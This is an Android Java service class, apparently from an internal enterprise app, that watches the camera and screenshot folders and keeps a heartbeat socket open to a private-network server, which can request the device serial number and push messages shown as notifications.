package app.dpapp.Service;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.Date;

import app.dpapp.R;

public class Scanimage extends Service {
    private static FileScan F1;
    private static FileScan F2;
    public static String sysAndroidID;

    private boolean soeketstatus = false;
    private static Thread socketthread;
    private static Thread heartbeatthread;
    private static Thread linstenthread;
    private static Socket socket;
    private static BufferedReader reader;//
    private static ObjectInputStream din;
    private static PrintWriter writer;//
    private static Date heartbeattime;
    private static int id = 0;

    private String Socketaddress = "10.151.128.65";

    public Scanimage() {
        Scanimage.sysAndroidID = getAndroidOsSystemProperties("ro.boot.serialno");

        scanimagemethod();
        startsocketservice();
//        sartwifiscan();
    }

    private void sartwifiscan() {
        Log.v("CMSF", "sartwifiscan 0");
        IntentFilter filter = new IntentFilter();
        filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        registerReceiver(new NetworkConnectChangedReceiver(), filter);
        Log.v("CMSF", "sartwifiscan 1");
    }

    private void newthreadstartservice() {
        socketthread = new Thread(new Runnable() {
            @Override
            public void run() {
                startservice(0);
            }
        });
        socketthread.start();
    }

    private void newthreadlinsten() {
        linstenthread = new Thread(new Runnable() {
            @Override
            public void run() {
                listensocket();
            }
        });
        linstenthread.start();
    }

    private void startsocketservice() {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                //Log.v("CMSF","ThreadStart");
                newthreadstartservice();

                newthreadlinsten();
                heartbeatthread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        while (true) {
                            try {
                                Log.v("CMSF", "heartbeat S:");
                                Thread.sleep(10 * 1000);
                                if (!soeketstatus) {
                                    checksocketlink();
                                } else if ((new Date().getTime() - heartbeattime.getTime()) > 1000 * 30) {
                                    soeketstatus = false;
                                    checksocketlink();
                                } else {
                                    sendmsg("heartbeat");
                                }
                            } catch (Exception ex1) {
                                Log.v("CMSF", "HeatBeatError" + ex1.getMessage());
                                checksocketlink();
//                                Log.v("CMSF", "heartbeat 1:"+ex1.getMessage());
                            }
                        }
                    }
                });
                heartbeatthread.start();
            }
        });
        t.start();
    }

    private void scanimagemethod() {
        try {
            Thread t = new Thread(new Runnable() {
                @Override
                public void run() {
                    F1 = null;
                    F1 = new FileScan("/storage/emulated/0/DCIM/Camera");
                    F1.startWatching();

                    F2 = null;
                    F2 = new FileScan("/storage/emulated/0/Pictures/Screenshots");
                    F2.startWatching();
                }
            });
            t.start();
        } catch (Exception ex) {
            curreatthread();
            //Log.v("CMSF", "ScanImage"+ex.getMessage().toString());
            scanimagemethod();
        }
    }

    private void curreatthread() {
        try {
            Thread.sleep(60 * 1000);
        } catch (InterruptedException iex1) {
        }
    }

    private void sendmsg(String s) {
        // Log.v("CMSF", "sendmsg " + s);
        try {
//            writer = new PrintWriter(new BufferedWriter(new OutputStreamWriter(
//                    socket.getOutputStream())), true);
//            writer.print("[startdata][" + s + "][enddata]");
            writer.write("[startdata][" + s + "][enddata]");
            writer.flush();
            Log.v("CMSF", s);
        }
//        catch(IOException iex)
//        {
//            checksocketlink();
//            Log.v("CMSF", "IOException-sendmsg"+s);
//        }
        catch (Exception ex) {
//            checksocketlink();
//            Log.v("CMSF", "sendmsg"+s);
        }
    }

    private void checkmsg(String s) {
        //Log.v("CMSF", "checkmsg "+s);
        try {
            if (s == null) {
                return;
            }
            s = s.substring(0, s.indexOf("[enddata]") + 9);
            s = s.substring(12, s.length() - 10);
            switch (s.trim()) {
                case "close":
                    break;
                case "start":
                    break;
                case "heartbeat":
                    heartbeattime = new Date();
                    break;
                case "clientinformation":
                    sendmsg("IP:" + sysAndroidID + ";"
                            + "HostName:" + sysAndroidID + ";"
                            + "CType:N1;SN:" + sysAndroidID + ";"
                    );

                    break;
                default:
                    s = s.substring(23, s.length());
                    String[] ss = s.split("\\]\\[");
                    NotificationManager manager = (NotificationManager) this.getSystemService(this.NOTIFICATION_SERVICE);
                    if (id == 10) {
                        id = 0;
                        manager.cancelAll();
                    }
                    Notification notification = new Notification.Builder(this)
                            .setSmallIcon(R.drawable.th_c)
                            .setTicker("TickerText:" + "CMSF Notice")
                            .setContentTitle(ss[3])
                            .setContentText(ss[4].substring(0, ss[4].length() - 1))
                            //.setContentIntent(pendingIntent3).setNumber(1)
                            .build();
                    notification.flags |= Notification.FLAG_AUTO_CANCEL;
                    notification.defaults |= Notification.DEFAULT_SOUND;

                    manager.notify(id, notification);
                    id++;
                    ss = null;
                    //setSmallIcon(R.drawable.message)
                    break;
            }
        } catch (Exception ex) {

        }
    }

    private void listensocket() {

        try {
            char[] chbuffer;
            String sendinfo = "";
            while (true) {
                Thread.sleep(50);
//                Log.v("CMSF", "listensocket-S");
                if (socket == null) {
                    continue;
                }

                if (socket != null && !socket.isClosed()) {// 如果socket没有被关闭
                    if (socket.isConnected()) {// 判断socket是否连接成功
                        if (!socket.isInputShutdown()) {
                            chbuffer = new char[4096];
                            reader.read(chbuffer, 0, 4096);
                            boolean checkendbool = true;
                            StringBuilder sb = new StringBuilder();
                            for (char c : chbuffer
                            ) {
                                if (c != '\u0000')
                                    sb.append(String.valueOf(c));
                            }
                            sendinfo = sb.toString();
                            if (sendinfo == "") {
                                continue;
                            }
//                            Log.v("CMSF", sendinfo);
                            while (checkendbool) {

                                if (sendinfo.indexOf("[enddata]") < 0) {
                                    checkendbool = false;
                                } else {
                                    String value = sendinfo.substring(0, sendinfo.indexOf("[enddata]") + 9);
                                    if (sendinfo.length() == value.length()) {
                                        sendinfo = "";
                                    } else {
//                                        Log.v("CMSF", value+"-"+sendinfo+"-"+value.length()+"-"+sendinfo.length());
                                        sendinfo = sendinfo.substring(value.length(), sendinfo.length());
                                    }
                                    ;
                                    Log.v("CMSF", value);
                                    checkmsg(value);
                                }
                            }
                        }
                    }
                }
            }
        } catch (SocketException ex) {
//            Log.v("CMSF", "listensocket-SocketException");
            soeketstatus = false;
//            checksocketlink();
            listensocket();
        } catch (Exception ex) {
//            Log.v("CMSF", "listensocket"+ex.getMessage());
            listensocket();
        }

    }

    private void checksocketlink() {
        try {
            if (!soeketstatus) {

                newthreadstartservice();
            }

        } catch (Exception ex) {
//            listensocket();
        }
    }

    private void startservice(int i) {
        try {
            socket = new Socket();
            socket.setReuseAddress(true);
            SocketAddress socAddress = new InetSocketAddress(Socketaddress, 8212);
            int ipAddress = ((WifiManager) getSystemService(this.WIFI_SERVICE)).getConnectionInfo().getIpAddress();
            String clientip = (ipAddress & 0xFF) + "." +
                    ((ipAddress >> 8) & 0xFF) + "." +
                    ((ipAddress >> 16) & 0xFF) + "." +
                    (ipAddress >> 24 & 0xFF);

            SocketAddress clientaddress = new InetSocketAddress(clientip, 50192);
            socket.bind(clientaddress);
            socket.connect(socAddress, 3000);
            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            writer = new PrintWriter(new BufferedWriter(new OutputStreamWriter(
                    socket.getOutputStream())), true);
            heartbeattime = new Date();
            soeketstatus = true;
            Log.v("CMSF", "Socket Connect Success");
        } catch (SocketException ex) {
            Log.v("CMSF", "SocketException:" + ex.getMessage() + "-" + ex.getStackTrace());
            soeketstatus = false;
//            checksocketlink();
        } catch (SocketTimeoutException ext) {
//            Log.v("CMSF", "SocketTimeoutException:"+ext.getMessage());
            soeketstatus = false;
//            checksocketlink();
        } catch (Exception ex) {
//            Log.v("CMSF", "Exception:"+ex.getMessage());
            soeketstatus = false;
//            checksocketlink();
        }
    }


    @Override
    public void onDestroy() {
        //android.os.Debug.waitForDebugger();
        super.onDestroy();
        try {
            socket.close();
            socket = null;
        } catch (IOException ex) {

        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public String getAndroidOsSystemProperties(String key) {
        String ret;
        try {
            Method systemProperties_get = null;

            systemProperties_get = Class.forName("android.os.SystemProperties").getMethod("get", String.class);
            if ((ret = (String) systemProperties_get.invoke(null, key)) != null) {
                return ret;
            } else {
                return null;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


}

